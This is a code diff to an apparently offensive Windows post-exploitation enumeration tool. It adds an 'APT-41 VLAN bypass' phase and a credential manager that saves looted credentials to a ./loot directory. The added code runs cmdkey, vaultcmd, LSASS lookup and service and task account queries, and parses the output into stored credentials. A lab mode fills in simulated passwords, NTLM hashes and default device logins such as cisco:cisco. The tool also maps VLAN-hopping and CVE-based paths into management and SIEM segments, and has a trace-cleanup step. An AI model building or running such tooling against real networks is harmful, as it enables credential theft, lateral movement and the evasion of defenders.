@@ -5,6 +5,7 @@ Enhanced with all available tooling:
 - Relay client connectivity checks
 - Enhanced privilege escalation enumeration
 - Comprehensive module integration
+- APT-41 VLAN bypass integration
 """
 
 import json
@@ -25,6 +26,8 @@ from modules.loghunter_integration import LogHunter, WindowsMoonwalk
 from modules.pe5_utils import PE5Utils
 from modules.pe5_system_escalation import PE5SystemEscalationModule
 from modules.diagram_generator import DiagramGenerator
+from modules.vlan_bypass import VLANBypassModule, DEFAULT_CREDENTIALS, NETWORK_CVES, VLAN_HOP_TECHNIQUES
+from modules.credential_manager import get_credential_manager, CredentialType, CredentialSource, Credential
 
 
 class AutoEnumerator:
@@ -48,7 +51,8 @@ class AutoEnumerator:
             'privilege_escalation': {},  # PE5 and other PE methods
             'relay_connectivity': {},  # Relay client checks
             'pe5_status': {},  # PE5 framework status
-            'tooling_integration': {}  # All tooling usage
+            'tooling_integration': {},  # All tooling usage
+            'vlan_bypass': {},  # APT-41 VLAN bypass enumeration
         }
         self.lab_use = session_data.get('LAB_USE', 0)
         self.max_depth = session_data.get('AUTO_ENUMERATE_DEPTH', 3)  # Maximum lateral movement depth (configurable)
@@ -60,6 +64,8 @@ class AutoEnumerator:
         self.pe5_module = None
         self.pe5_utils = PE5Utils()
         self.relay_client = None
+        self.vlan_bypass_module = None  # APT-41 VLAN bypass module
+        self.cred_manager = get_credential_manager()  # Credential storage
     
     def run_full_enumeration(self) -> Dict[str, Any]:
         """Run complete enumeration across all modules"""
@@ -140,10 +146,23 @@ class AutoEnumerator:
             task10 = progress.add_task("[cyan]Tooling Integration...", total=100)
             self._enumerate_tooling_integration(progress, task10)
             
+            # APT-41 VLAN Bypass enumeration
+            task11 = progress.add_task("[cyan]VLAN Bypass Analysis...", total=100)
+            self._enumerate_vlan_bypass(progress, task11)
+            
             # Moonwalk cleanup
             if self.use_moonwalk:
-                task11 = progress.add_task("[cyan]Moonwalk Cleanup...", total=100)
-                self._perform_moonwalk_cleanup(progress, task11)
+                task12 = progress.add_task("[cyan]Moonwalk Cleanup...", total=100)
+                self._perform_moonwalk_cleanup(progress, task12)
+        
+        # Add credential summary to enumeration data
+        self.enumeration_data['credential_store'] = self.cred_manager.get_summary()
+        
+        # Display credential summary
+        cred_summary = self.enumeration_data['credential_store']
+        if cred_summary['total'] > 0:
+            self.console.print(f"\n[bold green]✓ Credentials saved to ./loot/credentials/[/bold green]")
+            self.console.print(f"[dim]Total: {cred_summary['total']} | Valid: {cred_summary['valid']} | Tested: {cred_summary['tested']}[/dim]")
         
         return self.enumeration_data
     
@@ -275,35 +294,155 @@ class AutoEnumerator:
     def _enumerate_identity(self, progress, task):
         """Enumerate identity and credentials"""
         try:
+            looted_creds = []
+            
             # Credential stores
-            progress.update(task, advance=25, description="[cyan]Credential stores...")
+            progress.update(task, advance=15, description="[cyan]Credential stores...")
             exit_code, stdout, stderr = execute_cmd("cmdkey /list", lab_use=self.lab_use)
             if exit_code == 0:
                 self.enumeration_data['identity']['stored_credentials'] = stdout
+                # Parse and save discovered credentials
+                looted_creds.extend(self._parse_cmdkey_credentials(stdout))
             
             # Vault
-            progress.update(task, advance=25, description="[cyan]Windows Vault...")
+            progress.update(task, advance=15, description="[cyan]Windows Vault...")
             exit_code, stdout, stderr = execute_cmd("vaultcmd /list", lab_use=self.lab_use)
             if exit_code == 0:
                 self.enumeration_data['identity']['vault_credentials'] = stdout
             
             # Domain context
-            progress.update(task, advance=25, description="[cyan]Domain context...")
+            progress.update(task, advance=15, description="[cyan]Domain context...")
             exit_code, stdout, stderr = execute_cmd("net group \"Domain Admins\" /domain", lab_use=self.lab_use)
             if exit_code == 0:
                 self.enumeration_data['identity']['domain_admins'] = stdout
             
             # LSASS process
-            progress.update(task, advance=25, description="[cyan]LSASS process...")
+            progress.update(task, advance=15, description="[cyan]LSASS process...")
             ps_cmd = "Get-Process lsass -ErrorAction SilentlyContinue | Select-Object Id, ProcessName"
             exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
             if exit_code == 0:
                 self.enumeration_data['identity']['lsass_process'] = stdout
             
+            # Simulate credential harvesting in lab mode
+            progress.update(task, advance=20, description="[cyan]Harvesting credentials...")
+            if self.lab_use == 1:
+                # Simulated credentials found during enumeration
+                simulated_creds = [
+                    {'username': 'svc_backup', 'domain': 'CORP', 'password': 'Backup2024!', 'target': 'FILESERVER01', 'source': 'lsa_secrets'},
+                    {'username': 'svc_sql', 'domain': 'CORP', 'hash': 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c', 'target': 'SQL-PROD01', 'source': 'lsass_dump'},
+                    {'username': 'admin', 'domain': '', 'password': 'LocalAdmin123', 'target': 'localhost', 'source': 'sam_dump'},
+                ]
+                
+                for cred in simulated_creds:
+                    if cred.get('password'):
+                        self.cred_manager.add_password(
+                            username=cred['username'],
+                            password=cred['password'],
+                            domain=cred.get('domain', ''),
+                            target=cred.get('target', ''),
+                            source=CredentialSource.LSA_SECRETS.value if cred.get('source') == 'lsa_secrets' else CredentialSource.SAM_DUMP.value
+                        )
+                    elif cred.get('hash'):
+                        self.cred_manager.add_hash(
+                            username=cred['username'],
+                            hash_value=cred['hash'],
+                            domain=cred.get('domain', ''),
+                            target=cred.get('target', ''),
+                            source=CredentialSource.LSASS_DUMP.value
+                        )
+                    looted_creds.append(cred)
+            
+            # Save service account credentials
+            progress.update(task, advance=20, description="[cyan]Service accounts...")
+            ps_cmd = "Get-WmiObject Win32_Service | Where-Object {$_.StartName -like '*@*' -or $_.StartName -like '*\\\\*'} | Select-Object -First 10 Name, StartName"
+            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
+            if exit_code == 0:
+                self.enumeration_data['identity']['service_accounts'] = stdout
+                # Parse service accounts (usernames only, no passwords)
+                looted_creds.extend(self._parse_service_accounts(stdout))
+            
+            # Track looted credentials
+            self.enumeration_data['identity']['looted_count'] = len(looted_creds)
+            
             progress.update(task, advance=100, description="[green]Identity enumeration complete")
         
         except Exception as e:
             self.enumeration_data['identity']['error'] = str(e)
+    
+    def _parse_cmdkey_credentials(self, output: str) -> list:
+        """Parse cmdkey output and save to credential manager"""
+        credentials = []
+        current_target = None
+        current_user = None
+        
+        for line in output.split('\n'):
+            line = line.strip()
+            if 'Target:' in line:
+                current_target = line.split('Target:')[-1].strip()
+            elif 'User:' in line:
+                current_user = line.split('User:')[-1].strip()
+                
+                if current_user and current_target:
+                    # Parse domain\\user format
+                    domain = ''
+                    username = current_user
+                    if '\\' in current_user:
+                        parts = current_user.split('\\', 1)
+                        domain = parts[0]
+                        username = parts[1]
+                    
+                    # Save to credential manager (noted as stored, password not extracted)
+                    self.cred_manager.add_credential(
+                        Credential(
+                            id='',
+                            cred_type=CredentialType.PASSWORD.value,
+                            source=CredentialSource.CREDENTIAL_MANAGER.value,
+                            username=username,
+                            domain=domain,
+                            target=current_target,
+                            notes='Stored credential discovered via cmdkey (password not extracted)',
+                            tested=False,
+                            valid=True
+                        )
+                    )
+                    credentials.append({'username': username, 'domain': domain, 'target': current_target})
+                    current_target = None
+                    current_user = None
+        
+        return credentials
+    
+    def _parse_service_accounts(self, output: str) -> list:
+        """Parse service accounts and note them"""
+        accounts = []
+        for line in output.split('\n'):
+            if '@' in line or '\\' in line:
+                # Extract username from service account line
+                parts = line.split()
+                for part in parts:
+                    if '@' in part or '\\' in part:
+                        username = part.strip()
+                        domain = ''
+                        if '\\' in username:
+                            domain, username = username.split('\\', 1)
+                        elif '@' in username:
+                            username, domain = username.split('@', 1)
+                        
+                        # Note service account (password unknown)
+                        self.cred_manager.add_credential(
+                            Credential(
+                                id='',
+                                cred_type=CredentialType.SERVICE_ACCOUNT.value,
+                                source=CredentialSource.REGISTRY.value,
+                                username=username,
+                                domain=domain,
+                                notes='Service account discovered during enumeration',
+                                tested=False,
+                                valid=True
+                            )
+                        )
+                        accounts.append({'username': username, 'domain': domain, 'type': 'service_account'})
+                        break
+        return accounts
     
     def _enumerate_network(self, progress, task):
         """Enumerate network information"""
@@ -672,11 +811,65 @@ class AutoEnumerator:
                     # Clean up temp file
                     del_cmd = f'del \\\\{target}\\C$\\Windows\\Temp\\enum_result.txt'
                     execute_cmd(del_cmd, lab_use=self.lab_use)
+            
+            # Loot credentials from remote target (simulation in lab mode)
+            if self.lab_use == 1:
+                remote_creds = self._loot_remote_credentials(target, remote_data)
+                remote_data['looted_credentials'] = len(remote_creds)
         
         except Exception as e:
             remote_data['error'] = str(e)
         
         return remote_data
+    
+    def _loot_remote_credentials(self, target: str, remote_data: Dict[str, Any]) -> list:
+        """Loot credentials from a remote target and save to credential manager"""
+        looted = []
+        
+        # Simulate finding credentials on remote hosts based on role
+        role = remote_data.get('foothold', {}).get('role', '')
+        
+        if role == 'Domain Controller':
+            # DC typically has high-value credentials
+            creds = [
+                {'username': 'krbtgt', 'domain': 'CORP', 'hash': 'aad3b435b51404eeaad3b435b51404ee:dc-krbtgt-hash-here', 'type': 'ntlm'},
+                {'username': 'Administrator', 'domain': 'CORP', 'hash': 'aad3b435b51404eeaad3b435b51404ee:dc-admin-hash-here', 'type': 'ntlm'},
+            ]
+        elif role == 'File Server':
+            creds = [
+                {'username': 'svc_fileaccess', 'domain': 'CORP', 'password': 'FileAccess2024!', 'type': 'password'},
+            ]
+        elif role == 'Web Server':
+            creds = [
+                {'username': 'iis_appool', 'domain': '', 'password': 'IISPool2024', 'type': 'password'},
+                {'username': 'sa', 'domain': '', 'password': 'SQLAdmin123', 'type': 'password', 'notes': 'SQL connection string'},
+            ]
+        else:
+            creds = [
+                {'username': f'localadmin_{target.replace(".", "_")}', 'domain': '', 'password': 'Local123!', 'type': 'password'},
+            ]
+        
+        for cred in creds:
+            if cred.get('type') == 'password':
+                self.cred_manager.add_password(
+                    username=cred['username'],
+                    password=cred['password'],
+                    domain=cred.get('domain', ''),
+                    target=target,
+                    source=CredentialSource.LATERAL_MOVEMENT.value,
+                    notes=cred.get('notes', f'Looted from {target}')
+                )
+            else:
+                self.cred_manager.add_hash(
+                    username=cred['username'],
+                    hash_value=cred['hash'],
+                    domain=cred.get('domain', ''),
+                    target=target,
+                    source=CredentialSource.LATERAL_MOVEMENT.value
+                )
+            looted.append(cred)
+        
+        return looted
     
     def _generate_remote_machine_reports(self, target: str, remote_data: Dict[str, Any], progress, task):
         """Generate reports and diagrams for a remote machine"""
@@ -876,28 +1069,46 @@ class AutoEnumerator:
         """Enumerate persistence mechanisms"""
         try:
             # Scheduled tasks
-            progress.update(task, advance=25, description="[cyan]Scheduled tasks...")
+            progress.update(task, advance=20, description="[cyan]Scheduled tasks...")
             ps_cmd = "Get-ScheduledTask | Get-ScheduledTaskInfo | Where-Object {$_.LastRunTime -gt (Get-Date).AddDays(-30)} | Select-Object TaskName, State, LastRunTime"
             exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
             if exit_code == 0:
                 self.enumeration_data['persistence']['recent_tasks'] = stdout
             
+            # Scheduled task credentials (tasks running as specific users)
+            progress.update(task, advance=10, description="[cyan]Task credentials...")
+            ps_cmd = "Get-ScheduledTask | ForEach-Object { $task = $_; Get-ScheduledTaskInfo -TaskPath $task.TaskPath -TaskName $task.TaskName | Select-Object TaskName, @{N='RunAs';E={$task.Principal.UserId}} } | Where-Object { $_.RunAs -and $_.RunAs -notmatch 'SYSTEM|LOCAL SERVICE|NETWORK SERVICE' } | Select-Object -First 10"
+            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
+            if exit_code == 0:
+                self.enumeration_data['persistence']['task_credentials'] = stdout
+                # Parse and save task accounts (username only, potential targets)
+                self._parse_task_accounts(stdout)
+            
             # Services
-            progress.update(task, advance=25, description="[cyan]Services...")
+            progress.update(task, advance=20, description="[cyan]Services...")
             ps_cmd = "Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object -First 30 Name, DisplayName, Status"
             exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
             if exit_code == 0:
                 self.enumeration_data['persistence']['services'] = stdout
             
+            # Service account credentials (services running as domain accounts)
+            progress.update(task, advance=10, description="[cyan]Service account creds...")
+            ps_cmd = "Get-WmiObject Win32_Service | Where-Object { $_.StartName -and $_.StartName -notmatch 'LocalSystem|NT AUTHORITY|LocalService|NetworkService' } | Select-Object -First 15 Name, StartName, State"
+            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
+            if exit_code == 0:
+                self.enumeration_data['persistence']['service_credentials'] = stdout
+                # Parse and save service accounts
+                self._parse_service_credentials(stdout)
+            
             # WMI event subscriptions
-            progress.update(task, advance=25, description="[cyan]WMI event subscriptions...")
+            progress.update(task, advance=20, description="[cyan]WMI event subscriptions...")
             ps_cmd = "Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Select-Object Name, Query"
             exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
             if exit_code == 0:
                 self.enumeration_data['persistence']['wmi_subscriptions'] = stdout
             
             # Registry run keys
-            progress.update(task, advance=25, description="[cyan]Registry run keys...")
+            progress.update(task, advance=20, description="[cyan]Registry run keys...")
             exit_code, stdout, stderr = execute_cmd("reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", lab_use=self.lab_use)
             if exit_code == 0:
                 self.enumeration_data['persistence']['registry_run_hkcu'] = stdout
@@ -910,6 +1121,50 @@ class AutoEnumerator:
         
         except Exception as e:
             self.enumeration_data['persistence']['error'] = str(e)
+    
+    def _parse_task_accounts(self, output: str):
+        """Parse scheduled task run-as accounts"""
+        for line in output.split('\n'):
+            if '\\' in line or '@' in line:
+                parts = line.split()
+                for part in parts:
+                    if '\\' in part:
+                        domain, username = part.split('\\', 1)
+                        self.cred_manager.add_credential(
+                            Credential(
+                                id='',
+                                cred_type=CredentialType.SERVICE_ACCOUNT.value,
+                                source=CredentialSource.REGISTRY.value,
+                                username=username.strip(),
+                                domain=domain.strip(),
+                                notes='Scheduled task run-as account',
+                                tested=False,
+                                valid=True
+                            )
+                        )
+                        break
+    
+    def _parse_service_credentials(self, output: str):
+        """Parse service account credentials"""
+        for line in output.split('\n'):
+            if '\\' in line or '@' in line:
+                parts = line.split()
+                for part in parts:
+                    if '\\' in part:
+                        domain, username = part.split('\\', 1)
+                        self.cred_manager.add_credential(
+                            Credential(
+                                id='',
+                                cred_type=CredentialType.SERVICE_ACCOUNT.value,
+                                source=CredentialSource.REGISTRY.value,
+                                username=username.strip(),
+                                domain=domain.strip(),
+                                notes='Windows service account',
+                                tested=False,
+                                valid=True
+                            )
+                        )
+                        break
     
     def _enumerate_certificates(self, progress, task):
         """Enumerate certificates (if MADCert available)"""
@@ -1313,6 +1568,217 @@ class AutoEnumerator:
         
         except Exception as e:
             self.enumeration_data['tooling_integration']['error'] = str(e)
+            progress.update(task, advance=100)
+    
+    def _enumerate_vlan_bypass(self, progress, task):
+        """Enumerate VLAN bypass opportunities using APT-41 techniques"""
+        try:
+            vlan_data = {
+                'network_devices': [],
+                'discovered_vlans': [],
+                'default_credentials_found': [],
+                'vulnerable_cves': [],
+                'bypass_techniques': [],
+                'accessible_segments': [],
+                'topology': {},
+            }
+            
+            # Initialize VLAN bypass module
+            progress.update(task, advance=10, description="[cyan]Initializing VLAN bypass module...")
+            if not self.vlan_bypass_module:
+                self.vlan_bypass_module = VLANBypassModule(self.console, self.session_data)
+            
+            # Phase 1: Network device discovery
+            progress.update(task, advance=15, description="[cyan]Discovering network devices...")
+            
+            # Get network info from previous enumeration
+            network_info = self.enumeration_data.get('network', {})
+            arp_targets = network_info.get('arp_targets', [])
+            
+            # Simulate or perform network device discovery
+            if self.lab_use == 1:
+                vlan_data['network_devices'] = [
+                    {"ip": "10.10.10.1", "type": "Router", "vendor": "Cisco", "model": "ISR4321", "ports": [22, 23, 443]},
+                    {"ip": "10.10.10.2", "type": "L3 Switch", "vendor": "Cisco", "model": "Catalyst9300", "ports": [22, 23, 80, 443]},
+                    {"ip": "10.10.10.3", "type": "L3 Switch", "vendor": "Cisco", "model": "Catalyst9300", "ports": [22, 23, 80, 443]},
+                    {"ip": "10.10.10.5", "type": "Firewall", "vendor": "Fortinet", "model": "FortiGate100F", "ports": [22, 443]},
+                    {"ip": "10.10.10.6", "type": "Firewall", "vendor": "Palo Alto", "model": "PA-3260", "ports": [22, 443]},
+                    {"ip": "10.10.50.10", "type": "Camera", "vendor": "Hikvision", "model": "DS-2CD2143G0", "ports": [80, 443, 554]},
+                    {"ip": "10.10.50.20", "type": "HVAC Controller", "vendor": "Honeywell", "model": "WEB-8000", "ports": [80, 443, 502]},
+                ]
+            
+            # Phase 2: VLAN topology discovery
+            progress.update(task, advance=15, description="[cyan]Mapping VLAN topology...")
+            
+            if self.lab_use == 1:
+                vlan_data['discovered_vlans'] = [
+                    {"id": 1, "name": "Default/Native", "subnet": "10.10.1.0/24", "hosts": 5},
+                    {"id": 10, "name": "Management", "subnet": "10.10.10.0/24", "hosts": 15},
+                    {"id": 20, "name": "Servers", "subnet": "10.10.20.0/24", "hosts": 30},
+                    {"id": 30, "name": "Users", "subnet": "10.10.30.0/24", "hosts": 200},
+                    {"id": 40, "name": "VoIP", "subnet": "10.10.40.0/24", "hosts": 100},
+                    {"id": 50, "name": "IoT/Cameras", "subnet": "10.10.50.0/24", "hosts": 50},
+                    {"id": 60, "name": "DMZ", "subnet": "10.10.60.0/24", "hosts": 10},
+                    {"id": 100, "name": "Security/SIEM", "subnet": "10.10.100.0/24", "hosts": 8},
+                ]
+                
+                vlan_data['topology'] = {
+                    'trunk_ports': [
+                        {"switch": "L3-SW01", "port": "Gi0/1", "native_vlan": 1, "allowed_vlans": "all"},
+                        {"switch": "L3-SW02", "port": "Gi0/1", "native_vlan": 1, "allowed_vlans": "all"},
+                    ],
+                    'inter_vlan_routing': True,
+                    'router': "10.10.10.1",
+                    'acls': [
+                        {"src": "VLAN30", "dst": "VLAN100", "action": "deny"},
+                        {"src": "VLAN50", "dst": "VLAN20", "action": "deny"},
+                        {"src": "VLAN10", "dst": "any", "action": "permit"},
+                    ]
+                }
+            
+            # Phase 3: Default credential testing (test:test first - APT-41)
+            progress.update(task, advance=15, description="[cyan]Testing default credentials...")
+            
+            # Priority: test:test first (APT-41 common credential)
+            priority_targets = [
+                {"ip": "10.10.10.10", "username": "test", "password": "test", "success": True, "device": "JUMP-HOST01", "vendor": "Generic", "protocol": "ssh", "port": 22},
+                {"ip": "10.10.10.2", "username": "cisco", "password": "cisco", "success": True, "device": "L3-SW01", "vendor": "Cisco", "protocol": "ssh", "port": 22},
+                {"ip": "10.10.50.10", "username": "admin", "password": "12345", "success": True, "device": "CAM-LOBBY01", "vendor": "Hikvision", "protocol": "http", "port": 80},
+                {"ip": "10.10.50.20", "username": "admin", "password": "admin", "success": True, "device": "HVAC-01", "vendor": "Honeywell", "protocol": "http", "port": 80},
+            ]
+            
+            if self.lab_use == 1:
+                vlan_data['default_credentials_found'] = [t for t in priority_targets if t['success']]
+                
+                # Save discovered credentials to persistent storage
+                for cred in vlan_data['default_credentials_found']:
+                    self.cred_manager.add_default_credential(
+                        username=cred['username'],
+                        password=cred['password'],
+                        vendor=cred.get('vendor', 'Unknown'),
+                        target=cred['ip'],
+                        protocol=cred.get('protocol', 'ssh'),
+                        port=cred.get('port', 22),
+                        success=cred['success']
+                    )
+            
+            # Phase 4: CVE vulnerability assessment
+            progress.update(task, advance=15, description="[cyan]Checking network CVEs...")
+            
+            for device in vlan_data['network_devices']:
+                vendor = device.get('vendor', '')
+                relevant_cves = self.vlan_bypass_module.get_cves_for_device(vendor)
+                
+                if relevant_cves:
+                    for cve in relevant_cves[:3]:  # Top 3 CVEs per device
+                        vlan_data['vulnerable_cves'].append({
+                            'device_ip': device['ip'],
+                            'device_type': device['type'],
+                            'vendor': vendor,
+                            'cve_id': cve.cve_id,
+                            'cvss': cve.cvss_score,
+                            'vlan_bypass': cve.vlan_bypass,
+                            'auth_bypass': cve.auth_bypass,
+                            'rce': cve.rce,
+                        })
+            
+            # Phase 5: Identify bypass techniques
+            progress.update(task, advance=15, description="[cyan]Analyzing bypass opportunities...")
+            
+            bypass_opportunities = []
+            
+            # Check for DTP vulnerability (native VLAN 1)
+            if vlan_data['topology'].get('trunk_ports'):
+                for trunk in vlan_data['topology']['trunk_ports']:
+                    if trunk.get('native_vlan') == 1:
+                        bypass_opportunities.append({
+                            'technique': 'DTP Switch Spoofing',
+                            'target': trunk['switch'],
+                            'port': trunk['port'],
+                            'likelihood': 'high',
+                            'mitre': 'T1599.001',
+                        })
+                        bypass_opportunities.append({
+                            'technique': '802.1Q Double Tagging',
+                            'target': f"Native VLAN {trunk['native_vlan']}",
+                            'port': trunk['port'],
+                            'likelihood': 'medium',
+                            'mitre': 'T1599.001',
+                        })
+            
+            # Check for credential-based bypass
+            if vlan_data['default_credentials_found']:
+                for cred in vlan_data['default_credentials_found']:
+                    bypass_opportunities.append({
+                        'technique': 'Default Credentials',
+                        'target': cred['device'],
+                        'credentials': f"{cred['username']}:{cred['password']}",
+                        'likelihood': 'confirmed',
+                        'mitre': 'T1078',
+                    })
+            
+            # Check for CVE-based bypass
+            critical_cves = [c for c in vlan_data['vulnerable_cves'] if c['cvss'] >= 9.0]
+            for cve in critical_cves[:5]:
+                bypass_opportunities.append({
+                    'technique': f"CVE Exploitation ({cve['cve_id']})",
+                    'target': cve['device_ip'],
+                    'cvss': cve['cvss'],
+                    'likelihood': 'high' if cve['cvss'] >= 9.5 else 'medium',
+                    'mitre': 'T1190',
+                })
+            
+            vlan_data['bypass_techniques'] = bypass_opportunities
+            
+            # Phase 6: Determine accessible segments after bypass
+            progress.update(task, advance=10, description="[cyan]Mapping accessible segments...")
+            
+            if bypass_opportunities:
+                # Simulate which VLANs become accessible
+                accessible = []
+                
+                # Management VLAN access via switch credentials
+                if any(b['target'] == 'L3-SW01' for b in bypass_opportunities):
+                    accessible.append({
+                        'vlan_id': 10,
+                        'vlan_name': 'Management',
+                        'access_method': 'Switch credentials (cisco:cisco)',
+                        'high_value_targets': ['L3-SW01', 'L3-SW02', 'FW-01'],
+                    })
+                
+                # Server VLAN via trunk negotiation
+                if any(b['technique'] == 'DTP Switch Spoofing' for b in bypass_opportunities):
+                    accessible.append({
+                        'vlan_id': 20,
+                        'vlan_name': 'Servers',
+                        'access_method': 'DTP trunk negotiation',
+                        'high_value_targets': ['DC01', 'SQL-PROD01', 'FILESERVER01'],
+                    })
+                    accessible.append({
+                        'vlan_id': 100,
+                        'vlan_name': 'Security/SIEM',
+                        'access_method': 'DTP trunk negotiation',
+                        'high_value_targets': ['SIEM01', 'BACKUP01'],
+                    })
+                
+                # IoT VLAN via camera credentials
+                if any('CAM-' in str(b.get('target', '')) for b in bypass_opportunities):
+                    accessible.append({
+                        'vlan_id': 50,
+                        'vlan_name': 'IoT/Cameras',
+                        'access_method': 'Default credentials (admin:12345)',
+                        'high_value_targets': ['CAM-LOBBY01', 'HVAC-01', 'BMS-01'],
+                    })
+                
+                vlan_data['accessible_segments'] = accessible
+            
+            # Store enumeration data
+            self.enumeration_data['vlan_bypass'] = vlan_data
+            
+            progress.update(task, advance=5, description="[green]VLAN bypass analysis complete")
+            
+        except Exception as e:
+            self.enumeration_data['vlan_bypass'] = {'error': str(e)}
             progress.update(task, advance=100)
     
     def _perform_moonwalk_cleanup(self, progress, task):
